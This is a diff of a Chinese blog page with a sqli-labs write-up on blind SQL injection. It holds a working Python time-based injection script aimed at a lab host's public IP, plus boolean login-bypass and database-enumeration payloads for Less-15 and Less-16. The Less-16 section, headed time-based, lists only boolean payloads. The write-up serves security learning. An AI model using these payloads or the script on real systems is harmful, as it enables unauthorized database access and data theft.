@@ -79,12 +79,12 @@
 
 
 
-<meta name="description" content="sqli-labs less8-9-10。本篇介绍了盲注的原理以及less8-9-10的实践。less8-9-利用了burpsuite，以及自己写了个python poc爆出库名。less10和less9用了同个poc。">
+<meta name="description" content="sqli-labs less8-9-10,less15-16。本篇介绍了盲注的原理以及less8-9-10的实践。less8-9-利用了burpsuite，以及自己写了个python poc爆出库名。less10和less9用了同个poc。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL注入之Blind">
 <meta property="og:url" content="http://yoursite.com/2018/12/24/SQL注入之Blind/index.html">
 <meta property="og:site_name" content="Angie&#39;s blog">
-<meta property="og:description" content="sqli-labs less8-9-10。本篇介绍了盲注的原理以及less8-9-10的实践。less8-9-利用了burpsuite，以及自己写了个python poc爆出库名。less10和less9用了同个poc。">
+<meta property="og:description" content="sqli-labs less8-9-10,less15-16。本篇介绍了盲注的原理以及less8-9-10的实践。less8-9-利用了burpsuite，以及自己写了个python poc爆出库名。less10和less9用了同个poc。">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://i.loli.net/2018/12/24/5c20fcbec19e4.png">
 <meta property="og:image" content="https://i.loli.net/2018/12/24/5c20fcbecbf32.png">
@@ -92,10 +92,10 @@
 <meta property="og:image" content="https://i.loli.net/2019/01/06/5c32123b1421d.png">
 <meta property="og:image" content="https://i.loli.net/2019/01/06/5c32123b16507.png">
 <meta property="og:image" content="https://i.loli.net/2019/01/06/5c3211f933a68.png">
-<meta property="og:updated_time" content="2019-01-07T14:59:35.425Z">
+<meta property="og:updated_time" content="2019-01-24T14:52:00.343Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL注入之Blind">
-<meta name="twitter:description" content="sqli-labs less8-9-10。本篇介绍了盲注的原理以及less8-9-10的实践。less8-9-利用了burpsuite，以及自己写了个python poc爆出库名。less10和less9用了同个poc。">
+<meta name="twitter:description" content="sqli-labs less8-9-10,less15-16。本篇介绍了盲注的原理以及less8-9-10的实践。less8-9-利用了burpsuite，以及自己写了个python poc爆出库名。less10和less9用了同个poc。">
 <meta name="twitter:image" content="https://i.loli.net/2018/12/24/5c20fcbec19e4.png">
 
 
@@ -315,7 +315,7 @@
 
           
               <div class="post-description">
-                  sqli-labs less8-9-10。本篇介绍了盲注的原理以及less8-9-10的实践。less8-9-利用了burpsuite，以及自己写了个python poc爆出库名。less10和less9用了同个poc。
+                  sqli-labs less8-9-10,less15-16。本篇介绍了盲注的原理以及less8-9-10的实践。less8-9-利用了burpsuite，以及自己写了个python poc爆出库名。less10和less9用了同个poc。
               </div>
           
 
@@ -352,6 +352,15 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">database =[]</span><br><span class="line"></span><br><span class="line"><span class="comment"># and if ((payloads,sleep(5),null)#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database_length</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">21</span>):</span><br><span class="line">        <span class="comment"># 记录开始时间</span></span><br><span class="line">        startTime = time.time()</span><br><span class="line">        url = <span class="string">"http://43.247.91.228:84/Less-9/?id=1%27%20and%20if%20(length(database())=&#123;&#125;,sleep(5),null)%20--+"</span>.format(num)</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="comment"># 如果返回时间大于5s，则是结果</span></span><br><span class="line">        <span class="keyword">if</span> time.time() - startTime &gt; <span class="number">5</span>:</span><br><span class="line">            l = num</span><br><span class="line">            <span class="keyword">return</span> l</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database_name</span><span class="params">()</span>:</span></span><br><span class="line">    l = get_database_length()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, l+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> payload <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">137</span>):</span><br><span class="line">            startTime = time.time()</span><br><span class="line">            url = <span class="string">"http://43.247.91.228:84/Less-9/?id=1%27%20and%20if%20(ascii(substr((select database()),&#123;&#125;,1))=&#123;&#125;,sleep(5),null)%20--+"</span>.format(i,payload)</span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> time.time() - startTime &gt; <span class="number">5</span>:</span><br><span class="line">                database.append(payload)</span><br><span class="line">    database_str = <span class="string">''</span>.join(chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> database)</span><br><span class="line">    <span class="keyword">return</span> database_str</span><br><span class="line"></span><br><span class="line">print(get_database_name())</span><br></pre></td></tr></table></figure>
 <p><img src="https://i.loli.net/2019/01/06/5c3211f933a68.png" alt="less-9 python poc结果.png"></p>
 <h2 id="less-10-Blind-Time-based-Double-Quotes-String"><a href="#less-10-Blind-Time-based-Double-Quotes-String" class="headerlink" title="less-10 Blind-Time based- Double Quotes -String"></a>less-10 Blind-Time based- Double Quotes -String</h2><p>这题看题目就知道和less9的差别就在于一个单双引号。<br>我用了less9的poc，把url改了一下，且单引号%27变成了双引号%22。<br>得出库名为 security</p>
+<h1 id="Less-15-Blind-Boolian-Based-String"><a href="#Less-15-Blind-Boolian-Based-String" class="headerlink" title="Less-15 Blind- Boolian Based- String"></a>Less-15 Blind- Boolian Based- String</h1><p>根据盲注，判断这题是布尔盲注，根据注入信息会返回登录成功或失败。<br><strong>判断：</strong><br><code>uname=test&#39;&amp; passwd=test</code><br>返回LOGIN ATTEMPT FAILED</p>
+<p><strong>payload:</strong><br><code>uname=test&#39; or 1=1 # &amp; passwd=test</code></p>
+<p>此时返回SUCCESSFULLY LOGGED IN。</p>
+<p><strong>数据库长度：</strong><br><code>uname=test&#39; or length(database())=8 # &amp; passwd=test</code></p>
+<p><strong>判断数据库名称：</strong><br><code>uname=test&#39; or ascii(substr((select database()),1,1))=115 # &amp; passwd=test</code></p>
+<p>根据此遍历可判断出数据库名称。</p>
+<h1 id="Less-16-Blind-Time-Based-Double-qutes-String"><a href="#Less-16-Blind-Time-Based-Double-qutes-String" class="headerlink" title="Less-16- Blind- Time Based -Double qutes- String"></a>Less-16- Blind- Time Based -Double qutes- String</h1><p><strong>payload:</strong><br><code>uname=test&quot;) or 1=1 #&amp; passwd=test</code></p>
+<p><strong>判断数据库长度：</strong><br><code>uname=test&quot;) or length(database())=8 #&amp; passwd=test</code></p>
+<p><strong>判断数据库名称：</strong><br><code>uname=test&quot;) or ascii(substr((select database()),1,1))=115 #&amp; passwd=test</code></p>
 
       
     </div>
@@ -524,7 +533,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-原理"><span class="nav-number">1.</span> <span class="nav-text">0x00 原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-Sqli-labs"><span class="nav-number">2.</span> <span class="nav-text">0x01 Sqli-labs</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-8-Blind-Boolian-Single-Quotes-String"><span class="nav-number">2.1.</span> <span class="nav-text">Less-8 Blind-Boolian-Single Quotes- String</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-9-Blind-Time-based-Single-Quotes-String"><span class="nav-number">2.2.</span> <span class="nav-text">Less-9 Blind- Time based -Single Quotes -String</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-10-Blind-Time-based-Double-Quotes-String"><span class="nav-number">2.3.</span> <span class="nav-text">less-10 Blind-Time based- Double Quotes -String</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-原理"><span class="nav-number">1.</span> <span class="nav-text">0x00 原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-Sqli-labs"><span class="nav-number">2.</span> <span class="nav-text">0x01 Sqli-labs</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-8-Blind-Boolian-Single-Quotes-String"><span class="nav-number">2.1.</span> <span class="nav-text">Less-8 Blind-Boolian-Single Quotes- String</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-9-Blind-Time-based-Single-Quotes-String"><span class="nav-number">2.2.</span> <span class="nav-text">Less-9 Blind- Time based -Single Quotes -String</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less-10-Blind-Time-based-Double-Quotes-String"><span class="nav-number">2.3.</span> <span class="nav-text">less-10 Blind-Time based- Double Quotes -String</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-15-Blind-Boolian-Based-String"><span class="nav-number">3.</span> <span class="nav-text">Less-15 Blind- Boolian Based- String</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-16-Blind-Time-Based-Double-qutes-String"><span class="nav-number">4.</span> <span class="nav-text">Less-16- Blind- Time Based -Double qutes- String</span></a></li></ol></div>
             
 
           </div>
